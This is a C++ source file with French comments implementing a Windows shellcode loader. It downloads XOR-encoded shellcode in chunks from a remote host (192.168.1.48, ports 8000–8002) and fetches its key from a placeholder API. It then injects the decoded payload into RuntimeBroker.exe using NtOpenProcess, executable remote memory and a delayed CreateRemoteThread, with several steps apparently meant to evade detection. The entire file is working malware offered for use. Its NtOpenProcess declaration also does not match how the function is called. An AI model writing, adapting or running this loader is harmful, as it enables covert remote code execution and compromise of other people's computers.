#include <windows.h>
#include <winternl.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <ctime>
#include <cstdlib>

#pragma comment(lib, "wininet.lib")

using namespace std;

typedef LONG NTSTATUS;
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)
#define SystemProcessInformation 5

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Ne pas redéfinir CLIENT_ID car il est déjà défini dans winternl.h
// Nous utiliserons directement PCLIENT_ID comme défini par Windows

extern "C" {
    // Déclaration de la fonction NtQuerySystemInformation
    typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );

    // Déclaration simplifiée de NtOpenProcess (moins d'arguments)
    typedef NTSTATUS(NTAPI* pNtOpenProcess)(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ProcessId
        );
}

DWORD GetProcessIdByName_Native(const wchar_t* targetName) {
    // Charger la fonction NtQuerySystemInformation dynamiquement
    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        wcerr << L"[!] Impossible de localiser NtQuerySystemInformation" << endl;
        return 0;
    }

    ULONG bufferSize = 0x10000;
    PVOID buffer = nullptr;

    while (true) {
        buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return 0;

        NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, NULL);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            VirtualFree(buffer, 0, MEM_RELEASE);
            bufferSize *= 2;
        }
        else if (!NT_SUCCESS(status)) {
            VirtualFree(buffer, 0, MEM_RELEASE);
            return 0;
        }
        else {
            break;
        }
    }

    DWORD pid = 0;
    PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;

    while (true) {
        if (pInfo->ImageName.Buffer) {
            if (_wcsicmp(pInfo->ImageName.Buffer, targetName) == 0) {
                pid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
                break;
            }
        }

        if (pInfo->NextEntryOffset == 0)
            break;

        pInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pInfo + pInfo->NextEntryOffset);
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    return pid;
}

vector<unsigned char> DownloadShellcodeChunk(int port) {
    vector<unsigned char> chunk;
    HINTERNET hInternet = InternetOpen(L"ShellcodeLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return chunk;

    wstringstream urlStream;
    urlStream << L"http://192.168.1.48:" << port << L"/shellcode_chunk";
    wstring url = urlStream.str();

    HINTERNET hFile = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return chunk;
    }

    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        chunk.insert(chunk.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return chunk;
}

vector<unsigned char> GetFullShellcode() {
    vector<unsigned char> shellcode;
    int startPort = 8000;
    int numChunks = 3;

    for (int i = 0; i < numChunks; ++i) {
        int port = startPort + i;
        cout << "[~] Téléchargement du morceau sur le port " << port << "..." << endl;
        vector<unsigned char> chunk = DownloadShellcodeChunk(port);
        if (chunk.empty()) {
            cerr << "[!] Échec du téléchargement sur le port " << port << endl;
            break;
        }
        shellcode.insert(shellcode.end(), chunk.begin(), chunk.end());
        Sleep(3000);
    }

    return shellcode;
}

unsigned char GetXORKey(int keyPort = 7999) {
    HINTERNET hInternet = InternetOpen(L"KeyFetcher", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    wstringstream urlStream;
    urlStream << L"http://url_de_votre_api:" << keyPort << L"/key";
    wstring url = urlStream.str();

    HINTERNET hFile = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    char keyBuffer[1];
    DWORD bytesRead;
    if (!InternetReadFile(hFile, keyBuffer, 1, &bytesRead) || bytesRead != 1) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 0;
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return static_cast<unsigned char>(keyBuffer[0]);
}

void DecodeXORShellcode(vector<unsigned char>& shellcode, unsigned char key) {
    for (auto& byte : shellcode) {
        byte ^= key;
    }
}

bool InjectShellcode(DWORD pid, unsigned char* shellcode, size_t shellcodeSize) {
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = {};
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);  // Initialisation correcte

    // Charger la fonction NtOpenProcess dynamiquement
    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");
    if (!NtOpenProcess) {
        cerr << "[!] GetProcAddress(NtOpenProcess) a échoué" << endl;
        return false;
    }

    // Demander moins de droits au lieu de PROCESS_ALL_ACCESS
    ACCESS_MASK desiredAccess = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD;

    // Préparation du CLIENT_ID correctement
    CLIENT_ID clientId = {};
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    clientId.UniqueThread = NULL;

    // Appel à NtOpenProcess avec les droits minimaux nécessaires
    NTSTATUS status = NtOpenProcess(&hProcess, desiredAccess, &objAttr, &clientId);

    if (!NT_SUCCESS(status) || !hProcess) {
        cerr << "[!] NtOpenProcess a échoué. Code: " << hex << status << dec << endl;
        return false;
    }

    LPVOID remoteMem = VirtualAllocExNuma(hProcess, NULL, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);

    if (!remoteMem) {
        cerr << "[!] VirtualAllocExNuma a échoué : " << GetLastError() << endl;
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL)) {
        cerr << "[!] WriteProcessMemory a échoué" << endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, NULL,
        CREATE_SUSPENDED, NULL);

    if (!hThread) {
        cerr << "[!] CreateRemoteThread (suspendu) a échoué" << endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    cout << "[+] Thread distant suspendu créé !" << endl;

    srand((unsigned)time(NULL));
    int sleepMs = 1000 + (rand() % 3000);
    cout << "[~] Pause de " << sleepMs << " ms avant lancement du shellcode..." << endl;
    Sleep(sleepMs);

    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}

int main() {
    vector<unsigned char> shellcode = GetFullShellcode();
    unsigned char xorKey = GetXORKey();
    DecodeXORShellcode(shellcode, xorKey);

    DWORD pid = GetProcessIdByName_Native(L"RuntimeBroker.exe");
    if (pid == 0) {
        cerr << "[!] Impossible de trouver le processus cible" << endl;
        return 1;
    }

    cout << "[+] Injection du shellcode dans le processus cible..." << endl;
    if (InjectShellcode(pid, shellcode.data(), shellcode.size())) {
        cout << "[+] Injection réussie" << endl;
    }
    else {
        cerr << "[!] L'injection a échoué" << endl;
    }

    return 0;
}

